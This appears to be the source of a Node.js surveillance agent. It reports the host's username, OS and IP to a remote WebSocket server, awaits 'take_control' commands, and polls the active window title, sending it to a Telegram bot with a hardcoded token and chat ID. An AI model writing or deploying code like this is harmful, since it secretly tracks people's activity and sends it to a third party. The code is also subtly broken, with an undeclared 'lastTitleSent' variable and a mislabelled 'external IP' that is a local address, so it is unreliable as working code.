const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let isConnected = false;
let lastTitle = ""; // Track title to avoid duplicate logs

function initConnection() {
    ws = new WebSocket(WS_URL);

    ws.on('open', () => {
        reconnectAttempts = 0;
        isConnected = true;
        
        if (!myId) {
            const mac = getMacAddress();
            myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
        }
        
        // Send initial info
        safeSend(JSON.stringify({
            type: 'info',
            id: myId,
            os: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            ip: getExternalIP(),
            version: '2.2.0' // Optimized version
        }));

        joinAllAgents();
        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'take_control') takeControl(true);
            else if (data.type === 'release_control') takeControl(false);
        } catch (e) {}
    });

    ws.on('close', () => {
        isConnected = false;
        reconnect();
    });
}

function reconnect() {
    if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
        reconnectAttempts++;
        const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
        setTimeout(initConnection, delay);
    }
}

function safeSend(data) {
    if (!ws || ws.readyState !== WebSocket.OPEN) return false;
    try {
        ws.send(typeof data === "string" ? data : JSON.stringify(data));
        return true;
    } catch (error) { return false; }
}

function startMonitoring() {
    // Heartbeat (Every 30s)
    setInterval(() => {
        if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
    }, 30000);

    // Window Title Check (Every 5s - reduced frequency to save CPU)
    setInterval(async () => {
        const title = await getCurrentWindowTitle();
        if (title && title !== lastTitle) {
            lastTitle = title;
            // Only log to Telegram if we haven't sent one recently (simple throttle)
            if (!lastTitleSent || Date.now() - lastTitleSent > 60000) { 
                sendTelegram(`👁️ Current Window: ${title}`);
                lastTitleSent = Date.now();
            }
        }
        // Send a lightweight "alive" signal to keep admin updated
        safeSend(JSON.stringify({ type: 'screen_data', id: myId, data: 'ACTIVE', timestamp: Date.now() }));
    }, 5000);
}

async function getCurrentWindowTitle() {
    return new Promise((resolve) => {
        const platform = os.platform();
        let cmd = '';
        if (platform === 'win32') {
            cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
        } else if (platform === 'darwin') {
            cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
        } else {
            cmd = 'xdotool getwindowfocus getwindowname';
        }
        exec(cmd, (err, stdout) => { resolve(stdout.trim()); });
    });
}

function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {}).on('error', (e) => {});
}

function getExternalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) return net.address;
        }
    }
    return 'unknown';
}

function getMacAddress() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.mac !== '00:00:00:00:00:00') return net.mac;
        }
    }
    return 'default-mac';
}

function takeControl(state) {}
function joinAllAgents() {
    safeSend(JSON.stringify({ type: 'join_all', from: myId, timestamp: Date.now() }));
}

// Start
initConnection();
